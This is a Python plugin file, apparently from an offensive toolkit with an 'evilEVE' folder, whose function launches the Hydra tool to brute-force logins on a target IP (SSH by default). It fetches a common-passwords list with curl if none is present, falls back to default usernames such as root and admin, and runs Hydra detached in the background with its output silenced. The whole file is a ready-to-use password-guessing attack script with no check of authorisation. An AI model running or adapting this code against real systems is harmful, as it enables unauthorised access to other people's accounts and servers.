# plugins/hydra_plugin.py

import os
import subprocess
import time
from pathlib import Path
import shutil

def ensure_wordlist(file_path: str, default_content: str = "", source: str = ""):
    """Ensure the file exists. If not, create it or download if source is provided."""
    path = Path(file_path)
    if path.exists():
        return

    path.parent.mkdir(parents=True, exist_ok=True)

    if source:
        try:
            print(f"[hydra_plugin] Downloading: {source}")
            subprocess.run(["curl", "-L", source, "-o", str(path)], check=True)
            return
        except Exception as e:
            print(f"[hydra_plugin] Failed to download from {source}: {e}")

    # Fallback to creating minimal file
    print(f"[hydra_plugin] Creating fallback file: {file_path}")
    path.write_text(default_content)


def run_hydra_attack(target_ip, service="ssh", login_file=None, pass_file=None, log_dir="logs/hydra"):
    timestamp = int(time.time())
    Path(log_dir).mkdir(parents=True, exist_ok=True)
    log_path = os.path.join(log_dir, f"hydra_{target_ip}_{timestamp}.log")

    # === Set defaults
    if login_file is None:
        login_file = str(Path.home() / ".evilEVE/wordlists/users.txt")
    if pass_file is None:
        pass_file = "/usr/share/wordlists/rockyou.txt"

    # === Ensure both exist
    ensure_wordlist(login_file, default_content="root\nadmin\ntest\n")
    ensure_wordlist(pass_file, source="https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt")

    cmd = [
        "nohup", "hydra", "-L", login_file, "-P", pass_file,
        f"{target_ip}", service,
        "-o", log_path
    ]

    subprocess.Popen(
        cmd,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        preexec_fn=os.setpgrp
    )

    print(f"[hydra_plugin] Hydra attack launched on {target_ip}:{service} → log: {log_path}")
    return {
        "tool": "hydra",
        "target": target_ip,
        "service": service,
        "log_path": log_path,
        "login_file": login_file,
        "pass_file": pass_file
    }


